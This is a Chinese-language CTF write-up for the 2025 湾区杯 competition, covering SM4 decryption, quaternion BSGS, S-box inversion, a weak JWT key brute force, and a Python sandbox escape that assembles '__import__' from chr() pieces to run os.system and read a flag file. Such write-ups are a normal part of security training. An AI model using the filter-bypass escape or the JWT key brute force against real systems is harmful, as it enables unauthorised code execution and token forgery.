---
title: 2025 湾区杯网络安全竞赛 WriteUP（SM4 国密 + 沙箱逃逸 + JWT 爆破 + Quaternion BSGS + AES Sbox 逆推）
contest: 2025 湾区杯
year: 2025
difficulty: hard
vuln_type: [crypto_rsa, jwt, lattice, web_unknown, pwn_unknown]
tags: [湾区杯 2025, SM4 国密 32 轮 encrypt/decrypt, base64 VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu, 沙箱逃逸 chr(95)*2+builtins+chr(95)*2 globals[builtins][import] os, JWT HS256 2 字母爆破 @o70xO$0%#qR9#m0, Quaternion DLP BSGS secret < 2^50, AES-ECB + md5(secret) 派生密钥, 自定义 S-box invert_table 逆推, ROR 逆 sub_1492]
attack_chain:
  - SM4 国密 32 轮：FK[4] + CK[32] 固定 + 16 字节密钥 a8a58b78f41eeb6a
  - decrypt: cryptBlockDecrypt 倒序用 sk[31-i]
  - base64 解密 VCWB... → plaintext
  - 沙箱逃逸：chr(95)*2 + "builtins" + chr(95)*2 → globals()['__builtins__']['__import__']('os').system('cat /fl11lag')
  - JWT 2 字母爆破：jwtKey = "@o70xO$0%#qR9#" + 2 字母
  - Quaternion DLP BSGS: secret < 2^50 → AES key = md5(secret)
  - 自定义 S-box 逆推：byte_2120 → mapping = invert_table(sub_13E1) → ror(tmp, k) 逆 sub_1492
key_payload: "jwtKey = '@o70xO$0%#qR9#' + 2 字母 (charset 62)"
one_liner: 2025 湾区杯：SM4 国密 32 轮解密 + Python 沙箱逃逸 globals+builtins+import + JWT 2 字母爆破 + Quaternion DLP BSGS + 自定义 S-box 逆推。
lesson: SM4 32 轮国密 SPN：FK[4] + CK[32] 固定 + sk[32] 子密钥；JWT HS256 弱密钥爆破 62 字符×2=3844 次；Quaternion DLP BSGS secret<2^50 优化。
quality: high
---

# 2025 湾区杯网络安全竞赛 WriteUP

## 题目覆盖

### Crypto 1: SM4 国密

```php
class SM4 {
    const ENCRYPT = 1;
    private $sk;
    private static $FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC];
    private static $CK = [...32 字节...];
    private static $SboxTable = [...];
    
    public function __construct($key) { $this->setKey($key); }
    public function setKey($key) {  // 16 字节
        $key = $this->strToIntArray($key);
        $k = array_merge($key, [0,0,0,0]);
        for ($i = 0; $i < 4; $i++) $k[$i] ^= self::$FK[$i];
        for ($i = 0; $i < 32; $i++) {
            $k[$i+4] = $k[$i] ^ $this->CKF($k[$i+1], $k[$i+2], $k[$i+3], self::$CK[$i]);
            $this->sk[$i] = $k[$i+4];
        }
    }
    public function encrypt($plaintext) {...}
    private function cryptBlock($block, $mode) {
        $x = $this->strToIntArray($block);
        for ($i = 0; $i < 32; $i++) {
            $roundKey = $this->sk[$i];
            $x[4] = $x[0] ^ $this->F($x[1], $x[2], $x[3], $roundKey);
            array_shift($x);
        }
        $x = array_reverse($x);
        return $this->intArrayToStr($x);
    }
    private function cryptBlockDecrypt($block) {
        $x = $this->strToIntArray($block);
        for ($i = 0; $i < 32; $i++) {
            $roundKey = $this->sk[31 - $i];  // 倒序
            $x[4] = $x[0] ^ $this->F($x[1], $x[2], $x[3], $roundKey);
            array_shift($x);
        }
        ...
    }
}

$key = "a8a58b78f41eeb6a";
$sm4 = new SM4($key);
$cipher_b64 = "VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu";
$cipher = base64_decode($cipher_b64);
$plain = $sm4->decrypt($cipher);
```

### Python 沙箱逃逸

```python
def run():
    b = chr(95)*2 + "builtins" + chr(95)*2  # "__builtins__"
    aaa = globals()[b]
    bbb = chr(95)*2 + "imp" + "ort" + chr(95)*2  # "__import__"
    imp = aaa[bbb]
    ccc = imp("o" + "s")  # "os"
    ddd = chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)  # "system"
    return getattr(ccc, ddd)("cat /fl11lag >/tmp/aaa")
```

### JWT HS256 2 字母爆破

```go
jwtKey := "@o70xO$0%#qR9#" + 2 字母
// 遍历 62 字符 × 62 = 3844 次
```

### Quaternion DLP + BSGS

```python
class Quaternion:
    def __mul__(self, other):
        a1, b1, c1, d1 = self.a, self.b, self.c, self.d
        a2, b2, c2, d2 = other.a, other.b, other.c, other.d
        a_new = a1*a2 - b1*b2 - c1*c2 - d1*d2
        ...
        return Quaternion(a_new, b_new, c_new, d_new)

def power(base, exp):
    res = Quaternion(1, 0, 0, 0)
    while exp > 0:
        if exp & 1: res = res * base
        base = base * base
        exp //= 2
    return res

# Q = (123456789, 987654321, 135792468, 864297531)
# R = power(Q, secret)
# 优化 BSGS secret < 2^50
secret = bsgs(Q, R, 1 << 50)
# key = md5(str(secret).encode())
# AES-ECB decrypt ciphertext
```

### 自定义 S-box 逆推

```python
byte_2120 = [0x97, 0xD5, 0x60, 0x43, ...]  # 密文

def sub_12A9(a1, a2):  # ROL
    return ((a1 << a2) & 0xFF) | (a1 >> (8-a2))
def sub_12DE(a1, a2):  # ROR
    return (a1 >> a2) | ((a1 << (8-a2)) & 0xFF)
def sub_1313(a1):  # mod 257 pow
    v2, v3, v4 = 1, 255, a1
    while v3:
        if v3 & 1: v2 = (v4 * v2) % 257
        v4 = (v4 * v4) % 257
        v3 >>= 1
    return v2
def sub_13E1(a1):
    t1 = a1 ^ 0x5A
    v1 = sub_12A9(t1, 3)  # ROL3
    hi = (v1 >> 4) & 0xF
    lo = v1 & 0xF
    t = ((3 * hi) & 0xF) << 4 | ((5 * lo) & 0xF)
    v3 = sub_1313(t)  # mod 257 pow
    idx = sub_12DE(v3, 2) & 0xFF
    return byte_2020[idx]  # 256 字节 S-box

def invert_table():
    mapping = {}
    for x in range(256):
        y = sub_13E1(x)
        mapping[y] = x
    return mapping

mapping = invert_table()
flag_bytes = []
for i, b in enumerate(byte_2120):
    tmp = mapping[b]  # 逆 sub_13E1
    k = (i % 7) + 1
    orig = ror(tmp, k)  # 逆 sub_1492 (另一 ROR 层)
    flag_bytes.append(orig)
print(bytes(flag_bytes))
```
